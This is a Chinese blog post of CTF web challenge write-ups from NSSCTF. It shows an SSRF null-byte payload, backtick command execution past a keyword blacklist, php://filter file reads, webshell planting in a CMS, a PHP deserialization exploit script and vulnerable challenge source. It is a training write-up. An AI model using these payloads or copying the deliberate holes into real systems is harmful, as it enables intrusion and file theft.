<pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>b1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>b2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>c1<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>c2<span class="token operator">=</span>s878926199a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231016101927662.png" alt="image-20231016101927662"></p>
<hr>
<h1 id="GKCTF-2020-cve版签到"><a href="#GKCTF-2020-cve版签到" class="headerlink" title="[GKCTF 2020]cve版签到"></a>[GKCTF 2020]cve版签到</h1><blockquote>
<p>ssrf + cve-2020-7066</p>
</blockquote>
<p>响应头里有hint：Flag in localhost和tips：Host must be end with ‘123’</p>
<p>页面提示You just view *.ctfhub.com</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231016102359056.png" alt="image-20231016102359056"></p>
<p>点击View CTFHub可以发现跳转url的get请求为<code>?url=http://www.ctfhub.com</code></p>
<p>很明显存在ssrf漏洞</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231016102906555.png" alt="image-20231016102906555"></p>
<p>同时注意到这里的回显内容是用了<code>get_headers</code>函数</p>
<blockquote>
<p>取得服务器响应一个 HTTP 请求所发送的所有标头</p>
</blockquote>
<p>demo：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://www.example.com'</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">get_headers</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
/* 返回内容类似于
Array
(
    [0] => HTTP/1.1 200 OK
    [1] => Date: Sat, 29 May 2004 12:28:13 GMT
    [2] => Server: Apache/1.3.27 (Unix)  (Red-Hat/Linux)
    [3] => Last-Modified: Wed, 08 Jan 2003 23:11:55 GMT
    [4] => ETag: "3f80f-1b6-3e1cb03b"
    [5] => Accept-Ranges: bytes
    [6] => Content-Length: 438
    [7] => Connection: close
    [8] => Content-Type: text/html
)
*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>搜索相关的cve，可以发现CVE-2020-7066</p>
<blockquote>
<p>get_headers()会截断URL中空字符<code>%00</code>后的内容，版本：7.2.29之前的7.2.x、7.3.16之前的7.3.x、7.4.4之前的7.4.x</p>
</blockquote>
<p>题目的PHP版本是7.3.15，存在此漏洞</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.0.0.123%00.ctfhub.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>flag就在get_headers返回的响应头里</p>
<hr>
<h1 id="UUCTF-2022-新生赛-ez-rce"><a href="#UUCTF-2022-新生赛-ez-rce" class="headerlink" title="[UUCTF 2022 新生赛]ez_rce"></a>[UUCTF 2022 新生赛]ez_rce</h1><blockquote>
<p>RCE</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i'</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'看看你输入的参数！！！不叫样子！！'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你想干什么？？？？？？？？？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"居然都不输入参数，可恶!!!!!!!!!"</span><span class="token punctuation">;</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>过滤了挺多东西，一开始想取反一把梭的，但是发现题目环境好像是php5，不能用取反</p>
<p>但是没过滤反引号，可以进行命令执行</p>
<p>执行发现没输出结果，在反引号外面套一层<code>var_dump</code>来输出</p>
<p>用<code>\</code>来绕过<code>ls</code>的过滤，用<code>nl</code>读文件即可</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`l\s /`</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span>code<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`nl /fffffffffflagafag`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h1 id="羊城杯-2020-easycon"><a href="#羊城杯-2020-easycon" class="headerlink" title="[羊城杯 2020]easycon"></a>[羊城杯 2020]easycon</h1><p>进去直接访问index.php</p>
<p>ctrl+u查看html源码发现hint：<code>eval post cmd</code></p>
<p>直接传参<code>cmd=system(&#39;ls&#39;);</code></p>
<p>成功执行，读取一下index.php的源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('eval post cmd')&lt;/script>"</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>没有过滤，发现同目录下有个bbbbbbbbb.txt文件</p>
<p>直接读取</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">cmd<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat bbbbbbbbb.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到一张图片的编码</p>
<p>用cyberchef解码一下得到flag</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231016171303363.png" alt="image-20231016171303363"></p>
<hr>
<h1 id="SWPUCTF-2022-新生赛-ez-ez-php-revenge"><a href="#SWPUCTF-2022-新生赛-ez-ez-php-revenge" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_php(revenge)"></a>[SWPUCTF 2022 新生赛]ez_ez_php(revenge)</h1><blockquote>
<p>php伪协议</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"php"</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Nice!!!"</span><span class="token punctuation">;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> 

    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker!!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//flag.php </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先访问一下flag.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">NSSCTF</span><span class="token punctuation">&#123;</span>flag_is_not_here<span class="token punctuation">&#125;</span>
real_flag_is_in_ <span class="token string single-quoted-string">'/flag'</span>
换个思路，试试<span class="token constant">PHP</span>伪协议呢<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>flag在&#x2F;flag，那就php伪协议直接打</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/resource=/flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h1><blockquote>
<p>蝉知7.7cms</p>
</blockquote>
<p>y4爷的文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/118873773">https://blog.csdn.net/solitudi/article/details/118873773</a></p>
<p>尝试访问admin.php进入登录页面</p>
<p>用户名admin，密码用弱口令爆破即可得到12345</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231016172717059.png" alt="image-20231016172717059"></p>
<p>进入后台</p>
<p>跟着文章的操作做即可</p>
<p>在设计-高级里面写马</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231016174430908.png" alt="image-20231016174430908"></p>
<p>在设置-微信模块随便填写点东西保存</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231016173928290.png" alt="image-20231016173928290"></p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231016174107892.png" alt="image-20231016174107892"></p>
<p>在原始ID这里进行输入<code>../../../system/tmp/fbpo.txt/0</code>，最后那个txt名称为之前修改模板提示的文件</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231016174917980.png" alt="image-20231016174917980"></p>
<p>回到刚才的设计-高级，写马，成功保存</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231016175418456.png" alt="image-20231016175418456"></p>
<p>访问www路由，成功执行shell</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231016175522917.png" alt="image-20231016175522917"></p>
<hr>
<h1 id="第五空间-2021-pklovecloud"><a href="#第五空间-2021-pklovecloud" class="headerlink" title="[第五空间 2021]pklovecloud"></a>[第五空间 2021]pklovecloud</h1><blockquote>
<p>反序列化</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">pkshow</span> 
<span class="token punctuation">&#123;</span>  
    <span class="token keyword">function</span> <span class="token function-definition function">echo_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     
    <span class="token punctuation">&#123;</span>          
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Pk very safe^.^"</span><span class="token punctuation">;</span>      
    <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span> 

<span class="token keyword">class</span> <span class="token class-name-definition class-name">acp</span> 
<span class="token punctuation">&#123;</span>   
    <span class="token keyword">protected</span> <span class="token variable">$cinder</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$neutron</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$nova</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
    <span class="token punctuation">&#123;</span>      
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cinder</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">pkshow</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>  
    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      
    <span class="token punctuation">&#123;</span>          
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cinder</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cinder</span><span class="token operator">-></span><span class="token function">echo_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      
    <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span>  

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ace</span>
<span class="token punctuation">&#123;</span>    
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>     
    <span class="token keyword">public</span> <span class="token variable">$openstack</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$docker</span><span class="token punctuation">;</span> 
    <span class="token keyword">function</span> <span class="token function-definition function">echo_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      
    <span class="token punctuation">&#123;</span>   
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">openstack</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">docker</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">openstack</span><span class="token operator">-></span><span class="token property">neutron</span> <span class="token operator">=</span> <span class="token variable">$heat</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">openstack</span><span class="token operator">-></span><span class="token property">neutron</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">openstack</span><span class="token operator">-></span><span class="token property">nova</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"./<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         
            <span class="token punctuation">&#123;</span>              
                <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
            <span class="token punctuation">&#125;</span>  
            <span class="token keyword">else</span> 
            <span class="token punctuation">&#123;</span> 
                <span class="token keyword">return</span> <span class="token string double-quoted-string">"keystone lost~"</span><span class="token punctuation">;</span> 
            <span class="token punctuation">&#125;</span>    
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
<span class="token punctuation">&#123;</span>
    <span class="token variable">$logData</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$logData</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token keyword">else</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>出口在<code>ace::echo_name</code>的file_get_contents函数</p>
<p>链子：<code>acp::__construct -&gt; acp::__toString -&gt; ace::echo_name </code></p>
<p>这里为什么是<code>acp:: -&gt; acp::__toString</code>呢，原因是最底下的反序列化代码中存在<code>echo $logData; </code>，可以直接触发<code>__toString</code>魔术方法</p>
<p>然后在<code>__construct</code>方法中会先指定cinder属性的值，为了指向下一个要执行的类，我们需要修改为<code>$this-&gt;cinder = new ace;</code></p>
<p>注意<code>$cinder</code>是protect属性，要url编码%00</p>
<p>接下来到<code>ace::echo_name</code>，要实现文件读取就得先满足<code>$this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova</code></p>
<p>而<code>openstack</code>属性又被赋值为<code>unserialize($this-&gt;docker)</code>，接着下面的neutron又会被赋值<code>$this-&gt;openstack-&gt;neutron = $heat;</code>，要绕过这个赋值，我们可以直接让openstack的值为null，因为<code>NULL===NULL</code>，那么我们使<code>$this-&gt;docker =null</code>即可（其实不赋值也可以）</p>
<p>也可以用指针引用的方式来绕过<code>$a = new acp($b);$a-&gt;nova = &amp;$a-&gt;neutron;$b-&gt;docker = serialize($a);</code></p>
<p>exp：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">acp</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$cinder</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$neutron</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$nova</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cinder</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ace</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">ace</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$openstack</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$docker</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">acp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ctrl+u读到flag.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$heat</span><span class="token operator">=</span><span class="token string double-quoted-string">"asdasdasdasd53asd3a1sd3a1sd3asd"</span><span class="token punctuation">;</span>
<span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"flag in /nssctfasdasdflag"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>目录穿越读根目录得到flag<code>public $filename=&quot;../../../../nssctfasdasdflag&quot;;</code></p>
<p>非预期：phpinfo文件没删，直接访问</p>
<hr>
<h1 id="第五空间-2021-yet-another-mysql-injection"><a href="#第五空间-2021-yet-another-mysql-injection" class="headerlink" title="[第五空间 2021]yet_another_mysql_injection"></a>[第五空间 2021]yet_another_mysql_injection</h1><blockquote>
<p>quine注入 &#x2F; 扫描后台 &#x2F; 盲注</p>
</blockquote>
<p>这题好像有三种解法</p>
<p>先f12发现hint：<code>/?source</code></p>
<p>那么传参<code>/?source</code>，得到源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"lib.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">alertMes</span><span class="token punctuation">(</span><span class="token variable">$mes</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$mes</span><span class="token punctuation">&#125;</span></span>');location.href='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$url</span><span class="token punctuation">&#125;</span></span>';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">checkSql</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/regexp|between|in|flag|=|>|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'only admin can login'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">checkSql</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT password FROM users WHERE username='admin' and password='<span class="token interpolation"><span class="token variable">$password</span></span>';"</span><span class="token punctuation">;</span>
    <span class="token variable">$user_result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$user_result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"something wrong"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
